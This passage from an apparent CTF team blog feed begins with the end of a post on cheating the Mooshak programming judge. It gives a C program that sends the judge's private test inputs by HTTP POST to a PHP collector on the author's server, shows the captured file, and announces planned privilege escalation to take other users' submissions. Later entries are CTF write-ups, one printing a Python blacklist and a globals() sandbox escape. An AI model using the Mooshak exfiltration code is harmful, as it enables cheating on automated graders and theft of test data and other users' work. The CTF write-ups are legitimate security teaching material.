&#123;</span><br><span class="line">      htmlcontent = buf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(htmlstart) &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, htmlcontent);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, tmpres);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(get);</span><br><span class="line">  <span class="built_in">free</span>(remote);</span><br><span class="line">  <span class="built_in">free</span>(ip);</span><br><span class="line">  close(sock);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"USAGE: htmlget host [page]\n\</span></span><br><span class="line"><span class="string">\thost: the website hostname. ex: coding.debuntu.org\n\</span></span><br><span class="line"><span class="string">\tpage: the page to retrieve. ex: index.html, default: /\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_tcp_socket</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sock;</span><br><span class="line">  <span class="keyword">if</span>((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sock;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">get_ip</span><span class="params">(<span class="keyword">char</span> *host)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">hent</span>;</span></span><br><span class="line">  <span class="keyword">int</span> iplen = <span class="number">15</span>; <span class="comment">/*XXX.XXX.XXX.XXX*/</span></span><br><span class="line">  <span class="keyword">char</span> *ip = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(iplen+<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">memset</span>(ip, <span class="number">0</span>, iplen+<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span>((hent = gethostbyname(host)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(inet_ntop(AF_INET, (<span class="keyword">void</span> *)hent-&gt;h_addr_list[<span class="number">0</span>], ip, iplen) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ip;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">build_get_query</span><span class="params">(<span class="keyword">char</span> *host, <span class="keyword">char</span> *page)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *query;</span><br><span class="line">  <span class="keyword">char</span> *getpage = page;</span><br><span class="line">  <span class="keyword">char</span> *tpl = <span class="string">"GET /%s HTTP/1.0\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n"</span>;</span><br><span class="line">  <span class="keyword">if</span>(getpage[<span class="number">0</span>] == <span class="string">'/'</span>) &#123;</span><br><span class="line">    getpage = getpage + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Removing leading \"/\", converting %s to %s\n"</span>, page, getpage);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* -5 is to consider the %s %s %s in tpl and the ending \0 */</span></span><br><span class="line">  query = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="built_in">strlen</span>(host)+<span class="built_in">strlen</span>(getpage)+<span class="built_in">strlen</span>(USERAGENT)+<span class="built_in">strlen</span>(tpl)<span class="number">-5</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(query, tpl, getpage, host, USERAGENT);</span><br><span class="line">  <span class="keyword">return</span> query;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">build_post_query</span><span class="params">(<span class="keyword">char</span> *host, <span class="keyword">char</span> *page, <span class="keyword">char</span> *post_data)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *query;</span><br><span class="line">  <span class="keyword">char</span> *getpage = page;</span><br><span class="line">  <span class="keyword">char</span>* url_encoded = url_encode(post_data);</span><br><span class="line">  <span class="keyword">int</span> length_data = <span class="built_in">strlen</span>(url_encoded)+<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">char</span> *tpl = <span class="string">"POST /%s HTTP/1.0\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\nfield1=%s\r\n"</span>;</span><br><span class="line">  <span class="keyword">if</span>(getpage[<span class="number">0</span>] == <span class="string">'/'</span>) &#123;</span><br><span class="line">    getpage = getpage + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Removing leading \"/\", converting %s to %s\n"</span>, page, getpage);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* -5 is to consider the %s %s %s in tpl and the ending \0 */</span></span><br><span class="line"></span><br><span class="line">  query = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="built_in">strlen</span>(host)+<span class="built_in">strlen</span>(getpage)+<span class="built_in">strlen</span>(USERAGENT)+ <span class="built_in">strlen</span>(tpl) + <span class="built_in">strlen</span>(url_encoded) + <span class="number">33</span> - <span class="number">7</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(query, tpl, getpage, host, USERAGENT, length_data+<span class="number">1</span>, url_encoded);</span><br><span class="line">  <span class="keyword">return</span> query;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">join_strings</span><span class="params">(<span class="keyword">char</span> *one, <span class="keyword">char</span> *two)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *tpl = <span class="string">"%s%s"</span>;</span><br><span class="line">  <span class="keyword">char</span> *query;</span><br><span class="line">  query = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="built_in">strlen</span>(one)+<span class="built_in">strlen</span>(two)+<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(query, tpl, one, two);</span><br><span class="line">  <span class="keyword">return</span> query;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>And the php file (named as wtf.php in this example)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>($_POST[<span class="string">'field1'</span>]) ) &#123;</span><br><span class="line">  file_put_contents(<span class="string">"input.txt"</span>, urldecode($_POST[<span class="string">'field1'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>As you can see above this is just a php script which writes the output from <strong><em>POST</em></strong> parameter into a file named <strong><em>input.txt</em></strong> that you need to create on your server too.<br>So lets test this:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -O3 -ansi -Wall test.c -lm -o <span class="built_in">test</span></span><br><span class="line">$ cat input</span><br><span class="line">1 1</span><br><span class="line">2 1</span><br><span class="line">3 1</span><br><span class="line">2 4</span><br><span class="line">1 4</span><br><span class="line">$ ./<span class="built_in">test</span> &lt; input</span><br><span class="line">./<span class="built_in">test</span> &lt; input </span><br><span class="line">IP is 127.0.0.1</span><br><span class="line">Removing leading <span class="string">"/"</span>, converting /wtf.php to wtf.php</span><br><span class="line">Query is:</span><br><span class="line">&lt;&lt;START&gt;&gt;</span><br><span class="line">POST /wtf.php HTTP/1.0</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: HTMLGET 1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 17</span><br><span class="line"></span><br><span class="line">field1=---------------</span><br><span class="line">&lt;&lt;END&gt;&gt;</span><br><span class="line">IP is 127.0.0.1</span><br><span class="line">Removing leading <span class="string">"/"</span>, converting /wtf.php to wtf.php</span><br><span class="line">Query is:</span><br><span class="line">&lt;&lt;START&gt;&gt;</span><br><span class="line">POST /wtf.php HTTP/1.0</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: HTMLGET 1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 57</span><br><span class="line"></span><br><span class="line">field1=1%2b1%250a2%2b1%250a3%2b1%250a2%2b4%250a1%2b4%250a%250a</span><br><span class="line">&lt;&lt;END&gt;&gt;</span><br></pre></td></tr></table></figure><p>And now checking the server files:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/var/www/html</span><br><span class="line">$ ls</span><br><span class="line">index.cgi  input.txt  wtf.php</span><br><span class="line">$ cat input.txt </span><br><span class="line">1 1</span><br><span class="line">2 1</span><br><span class="line">3 1</span><br><span class="line">2 4</span><br><span class="line">1 4</span><br></pre></td></tr></table></figure><p>And we can see it works perfectly like this you can steal any private test input from mooshak. You may be asking if there is a way to get the output as well and the answer for now is actually no, but I’m currently researching a way to do this and I can say I’m very near to actually do it and if successful I can not only get the test outputs but the other user project submissions as well, the process to do this is an actual hack which involves privilege escalation so stay tuned for more posts. </p><p>If you liked this post please follow us in twitter and consider joining our CTF team. </p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;A long time ago in a secret meme group far far away I did find this:&lt;/p&gt;
&lt;p&gt;&lt;a data-fancybox=&quot;gallery&quot; href=&quot;https://i.imgur.com/Be1WLE5.
      
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="mooshak" scheme="https://teamrocketist.github.io/tags/mooshak/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] InCTF 2018 - load3r</title>
    <link href="https://teamrocketist.github.io/2018/10/11/Reverse-InCTF-2018-load3r/"/>
    <id>https://teamrocketist.github.io/2018/10/11/Reverse-InCTF-2018-load3r/</id>
    <published>2018-10-11T03:56:04.000Z</published>
    <updated>2018-10-24T23:21:04.822Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br><br>load3r<br>100<br><br>======= Difficulty level : Easy ========<br><br>A basic bootloader challenge. Note: The flag format is inctf{correct_input}<br><br>Note: The challenge must be run in qemu-system-i386 version 2.5.0<br><br>========== Authors : b3y0nd3r, r00tus3r ==========<br></blockquote><p>They gave us a file named <em>boot sector</em><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file boot_try.bin </span><br><span class="line">boot_try.bin: DOS/MBR boot sector</span><br></pre></td></tr></table></figure></p><p>So lets first run the binary on an emulator named qemu:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-system-i386 -drive format=raw,file=boot_try.bin</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/8Wt66UE.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/8Wt66UE.png" alt=""><br></a></p><p>We can see some strings like <strong><em>ENTER THE FLAG</em></strong> and the message <strong><em>NOOOO</em></strong> when we insert an incorrect flag, this strings can help us to localize certain parts of the code while reversing, so first thing I did was to look up for this strings in IDA and search on which zones they are referenced.</p><p>At first I was having some trouble with IDA because I was choosing the wrong architecture when opening the binary and IDA wasn’t able to disassemble the code, the only thing that was showing was the strings so make sure you <strong><em>say no</em></strong> to disassemble the binary in 16 bits instead of the 32 bits.</p><p><a data-fancybox="gallery" href="https://i.imgur.com/4kHWAD5.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/4kHWAD5.png" alt=""><br></a></p><p>After pressing no, we can already see where is the location of the strings we saw when executing the binary… </p><p><a data-fancybox="gallery" href="https://i.imgur.com/d97jqKF.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/d97jqKF.png" alt=""><br></a></p><p>So we can start taking some notes from where they start in the binary (note that since the boot sector hasn’t been loaded into memory by the bios, all the addresses are starting from 0 but when we start debugging it everything will start after 0x7c00):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7c16 ENTER THE FLAG\r\n -&gt; calculated with 0x7c00 + 0x16</span><br><span class="line">0x7c27 w2g1kS&lt;c7me3keeuSMg1kSk%Se&lt;=S3%/e/\r\n -&gt; calculated with 0x7c00 + 0x27</span><br><span class="line">0x7c4c Yeah, that is the flag\r\n -&gt; calculated with 0x7c00 + 0x4c</span><br><span class="line">0x7c65 8 7 NOOOO\r\n -&gt; calculated with 0x7c00 + 0x65</span><br><span class="line">0x7cc9 37 36 0100010011011101111111011010110101\r\n -&gt; calculated with 0x7c00 + 0xc9</span><br></pre></td></tr></table></figure><p>Now we have 2 subroutines to analyse, lets start by the smallest one:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/paHB5U2.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/paHB5U2.png" alt=""><br></a></p><p>IDA’s comments are very explanatory, this is a function that writes a character into the screen by performing an interruption, so we can just rename this function to print since will be easier to us to identify it when it is called again.</p><p><a data-fancybox="gallery" href="https://i.imgur.com/tqpZzRW.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/tqpZzRW.png" alt=""><br></a></p><p>From the image above we can already assume that the flag must have 34 characters if we insert something that doesn’t have that size we go directly to printing the wrong flag message <strong><em>NOOO</em></strong>.</p><p><a data-fancybox="gallery" href="https://i.imgur.com/GqA9h8v.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/GqA9h8v.png" alt=""><br></a></p><p>But if we instead give a 34 character string we go through the green flow</p><p><a data-fancybox="gallery" href="https://i.imgur.com/tiKrTXA.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/tiKrTXA.png" alt=""><br></a></p><p>The image above is a loop, which iterates all the characters we inserted in the program, after doing the shifts we enter into the final character modification:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/ehuu9Gc.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/ehuu9Gc.png" alt=""><br></a></p><p>We need to reverse this encryption function by doing exactly the opposite:</p><p>Example<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">encryption function -&gt; </span><br><span class="line">lr_string = &apos;0&apos;</span><br><span class="line">flag_string = &apos;T&apos;</span><br><span class="line">for the first character (shift right because the 1st of lr_string is zero):</span><br><span class="line">chr((ord(&apos;T&apos;) &gt;&gt; 1 ) ^ 5) = /</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reverse function -&gt; </span><br><span class="line">lr_string = &apos;0&apos;</span><br><span class="line">encryption_string = &apos;/&apos;</span><br><span class="line">for the first character (shift left because we are reversing it and before we shift righted):</span><br><span class="line">chr((ord(&apos;/&apos;) ^ 5) &lt;&lt; 1) = T</span><br></pre></td></tr></table></figure><p>Of course it’s much easier to understand all this assembly while debugging and analysing the code… the way I did it was opening gdb and running this commands inside of it, after the commands bellow is just a matter of putting more breakpoints and reading registers etc etc:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">target remote | qemu-system-i386 -S -gdb stdio -m 512 -hda boot_try.bin</span><br><span class="line"><span class="built_in">set</span> architecture i8086</span><br><span class="line">b *0x7c00</span><br></pre></td></tr></table></figure><p>We have now everything to recover the flag it’s trivial to write a python script that recovers the flag for us:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">left_or_right = <span class="string">'0100010011011101111111011010110101'</span></span><br><span class="line">enc = <span class="string">"\x77\x32\x67\x31\x6B\x53\x3C\x63\x37\x6D\x65\x33\x6B\x65\x65\x75\x53\x4D\x67\x31\x6B\x53\x6B\x25\x53\x65\x3C\x3D\x53\x33\x25\x2F\x65\x2F"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> enumerate(enc[::<span class="number">-1</span>]):</span><br><span class="line">    a = ord(c) ^ <span class="number">5</span></span><br><span class="line">    <span class="keyword">if</span> left_or_right[i] == <span class="string">'0'</span>:</span><br><span class="line">        flag += chr(a &lt;&lt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += chr(a &gt;&gt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'inctf&#123;'</span>+flag+<span class="string">'&#125;'</span></span><br></pre></td></tr></table></figure><p>Running it</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python final.py</span><br><span class="line">inctf&#123;T0T@l+pr0+@7+7h1$+8007l04d3r+7h1n9&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;&lt;br&gt;load3r&lt;br&gt;100&lt;br&gt;&lt;br&gt;======= Difficulty level : Easy ========&lt;br&gt;&lt;br&gt;A basic bootloader challenge. Note: The flag format
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="InCTF2018" scheme="https://teamrocketist.github.io/tags/InCTF2018/"/>
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="qemu" scheme="https://teamrocketist.github.io/tags/qemu/"/>
    
      <category term="i386" scheme="https://teamrocketist.github.io/tags/i386/"/>
    
      <category term="mbr" scheme="https://teamrocketist.github.io/tags/mbr/"/>
    
      <category term="boot_sector" scheme="https://teamrocketist.github.io/tags/boot-sector/"/>
    
  </entry>
  
  <entry>
    <title>[Forensics] InCTF 2018 - Winter Sport</title>
    <link href="https://teamrocketist.github.io/2018/10/09/Forensics-InCTF-2018-Winter-Sport/"/>
    <id>https://teamrocketist.github.io/2018/10/09/Forensics-InCTF-2018-Winter-Sport/</id>
    <published>2018-10-09T21:00:56.000Z</published>
    <updated>2018-10-24T23:21:04.822Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Winter Sport<br>996<br><br>======= Difficulty level : Easy ========<br><br>I have a friend named Jake.We were watching a football tournament on one fine chilly morning. Meanwhile Jake’s sister Susan did something mischievous which cause Jake to lose some really important data. We could only find this piece of evidence, can you recover it for him?<br><br>========== Authors : cr4ck3t, stuxn3t ==========<br><br></blockquote><p>In this challenge, it is provided a zip file containing a pdf <em>file.pdf</em> where it is possible to find the following message.</p><p><a data-fancybox="gallery" href="https://i.imgur.com/vP1vAOp.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/vP1vAOp.png" alt=""><br></a></p><p>Besides this clear message, after running <strong>binwalk</strong>, we can find that there is another 7z archive. </p><p><a data-fancybox="gallery" href="https://i.imgur.com/tkshXno.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/tkshXno.png" alt=""><br></a></p><p>After extracting this 7z archive it is revealed another pdf, <em>omg.pdf</em>, containing the following characters,</p><p><a data-fancybox="gallery" href="https://i.imgur.com/f8jgvem.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/f8jgvem.png" alt=""><br></a></p><p>Well at first by opening the pdf in a text editor, we saw the composition of the pdf <em>/ProcSet [/PDF /Text /ImageB /ImageC]</em>, saying that it contains 2 images although the pdf seemed to be corrupted, since we tried to extract the images from this pdf and there were some errors (some <em>endstreams</em> were missing and some other stuff regarding the pdf structure file). After we found what it seemed to be the encoding for those characters from the image above and they would translate into <strong>“What is Steganography ?Steganography is an amaz”</strong> but nothing more than that.<br>Since we couldn’t find a clear way, we were going to fix the pdf anatomically speaking, and then we saw this.</p><p><a data-fancybox="gallery" href="https://i.imgur.com/IDgXOj1.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/IDgXOj1.png" alt=""><br></a></p><p>Well a bunch os spaces and tabs, just on the first 13 lines of the pdf? Due to Sublime Text (where tabs -&gt; “-“ and spaces -&gt; “.”) the idea of being another <strong>morse code</strong> related challenge, but well how could we find the spaces? what if we were using other text editor? Other options that came to our mind was <strong><a href="https://en.wikipedia.org/wiki/Whitespace_(programming_language" target="_blank" rel="noopener">Whitespace</a>)</strong> and due to the message “What is Steganography ?Steganography is an amaz” we searched for steganography whitespace and we found <strong><a href="http://manpages.ubuntu.com/manpages/bionic/man1/stegsnow.1.html" target="_blank" rel="noopener">Stegsnow</a></strong> which “is a program for concealing messages in text files by appending tabs  and  spaces on  the  end  of lines, and <strong>for extracting messages from files containing hidden messages</strong>“. That was exactly what we wanted. Running it on the given <em>omg.pdf</em> it gave us the flag.</p><p><a data-fancybox="gallery" href="https://i.imgur.com/KAuVS6i.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/KAuVS6i.png" alt=""><br></a></p><p><strong>Flag: </strong> inctf{w3lcom3_t0_7h3_w0rld_0f_whit3sp4c3}</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;Winter Sport&lt;br&gt;996&lt;br&gt;&lt;br&gt;======= Difficulty level : Easy ========&lt;br&gt;&lt;br&gt;I have a friend named Jake.We were watching a foo
      
    
    </summary>
    
      <category term="Forensics" scheme="https://teamrocketist.github.io/categories/Forensics/"/>
    
    
      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
    
      <category term="steganography" scheme="https://teamrocketist.github.io/tags/steganography/"/>
    
      <category term="whitespace_steganography" scheme="https://teamrocketist.github.io/tags/whitespace-steganography/"/>
    
      <category term="InCTF2018" scheme="https://teamrocketist.github.io/tags/InCTF2018/"/>
    
  </entry>
  
  <entry>
    <title>[Web] InCTF 2018 - The Most Secure File Uploader</title>
    <link href="https://teamrocketist.github.io/2018/10/08/Web-InCTF-2018-The-Most-Secure-File-Uploader/"/>
    <id>https://teamrocketist.github.io/2018/10/08/Web-InCTF-2018-The-Most-Secure-File-Uploader/</id>
    <published>2018-10-08T00:09:56.000Z</published>
    <updated>2018-10-24T23:21:04.842Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>The Most Secure File Uploader<br>100<br><br>======= Difficulty level : Medium ========<br><br>Somehow the codes are all messed up and it seems that it was my younger brother. He messed up my File Uploader. But I know you…You don’t look like a hacker at all…Can you fix this for me? :)<br><br>link<br><br>========== Authors : c3rb3ru5, Nimisha, SpyD3r ==========<br><br></blockquote><p>After a long pause we are happy to announce that we are doing CTFs again so more write ups coming soon this month :). </p><p>Starting with something simple we have a web challenge where it’s hinted that we probably need to upload something malicious to the server, for the begining I decided to upload a random image without nothing special:<br><a data-fancybox="gallery" href="https://i.imgur.com/SIdVAKj.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/SIdVAKj.png" alt=""><br></a></p><p>And we can already see something interesting, we have a traceback error and we can easily identify it as being from python, the file name is being executed as python code, after some testing I noticed that a lot of words were blacklisted:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklisted = <span class="string">r"import|os|class|subclasses|mro|request|args|eval|if|for|\%|subprocess|file|open|popen|builtins|\+|compile|execfile|from_pyfile|config|local|\`|\||\&amp;|\;|\&#123;|\&#125;"</span></span><br></pre></td></tr></table></figure><p>As we know blacklisting is always a bad practice after testing for a while I noticed that <strong><em>globals()</em></strong> wasn’t being blocked and from globals we can easily can get the builtin function from python :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print globals()"</span></span><br><span class="line">&#123;<span class="string">'__builtins__'</span>: &lt;module <span class="string">'__builtin__'</span> (built-in)&gt;, <span class="string">'__name__'</span>: <span class="string">'__main__'</span>, <span class="string">'__doc__'</span>: None, <span class="string">'__package__'</span>: None&#125;</span><br><span class="line">$ python -c <span class="string">"print globals().values()[0]"</span></span><br><span class="line">&lt;module <span class="string">'__builtin__'</span> (built-in)&gt;</span><br><span class="line">$ python -c <span class="string">"print dir(globals().values()[0])"</span></span><br><span class="line">[<span class="string">'ArithmeticError'</span>, <span class="string">'AssertionError'</span>, <span class="string">'AttributeError'</span>, <span class="string">'BaseException'</span>, <span class="string">'BufferError'</span>, <span class="string">'BytesWarning'</span>, <span class="string">'DeprecationWarning'</span>, <span class="string">'EOFError'</span>, <span class="string">'Ellipsis'</span>, <span class="string">'EnvironmentError'</span>, <span class="string">'Exception'</span>, <span class="string">'False'</span>, <span class="string">'FloatingPointError'</span>, <span class="string">'FutureWarning'</span>, <span class="string">'GeneratorExit'</span>, <span class="string">'IOError'</span>, <span class="string">'ImportError'</span>, <span class="string">'ImportWarning'</span>, <span class="string">'IndentationError'</span>, <span class="string">'IndexError'</span>, <span class="string">'KeyError'</span>, <span class="string">'KeyboardInterrupt'</span>, <span class="string">'LookupError'</span>, <span class="string">'MemoryError'</span>, <span class="string">'NameError'</span>, <span class="string">'None'</span>, <span class="string">'NotImplemented'</span>, <span class="string">'NotImplementedError'</span>, <span class="string">'OSError'</span>, <span class="string">'OverflowError'</span>, <span class="string">'PendingDeprecationWarning'</span>, <span class="string">'ReferenceError'</span>, <span class="string">'RuntimeError'</span>, <span class="string">'RuntimeWarning'</span>, <span class="string">'StandardError'</span>, <span class="string">'StopIteration'</span>, <span class="string">'SyntaxError'</span>, <span class="string">'SyntaxWarning'</span>, <span class="string">'SystemError'</span>, <span class="string">'SystemExit'</span>, <span class="string">'TabError'</span>, <span class="string">'True'</span>, <span class="string">'TypeError'</span>, <span class="string">'UnboundLocalError'</span>, <span class="string">'UnicodeDecodeError'</span>, <span class="string">'UnicodeEncodeError'</span>, <span class="string">'UnicodeError'</span>, <span class="string">'UnicodeTranslateError'</span>, <span class="string">'UnicodeWarning'</span>, <span class="string">'UserWarning'</span>, <span class="string">'ValueError'</span>, <span class="string">'Warning'</span>, <span class="string">'ZeroDivisionError'</span>, <span class="string">'__debug__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__import__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'abs'</span>, <span class="string">'all'</span>, <span class="string">'any'</span>, <span class="string">'apply'</span>, <span class="string">'basestring'</span>, <span class="string">'bin'</span>, <span class="string">'bool'</span>, <span class="string">'buffer'</span>, <span class="string">'bytearray'</span>, <span class="string">'bytes'</span>, <span class="string">'callable'</span>, <span class="string">'chr'</span>, <span class="string">'classmethod'</span>, <span class="string">'cmp'</span>, <span class="string">'coerce'</span>, <span class="string">'compile'</span>, <span class="string">'complex'</span>, <span class="string">'copyright'</span>, <span class="string">'credits'</span>, <span class="string">'delattr'</span>, <span class="string">'dict'</span>, <span class="string">'dir'</span>, <span 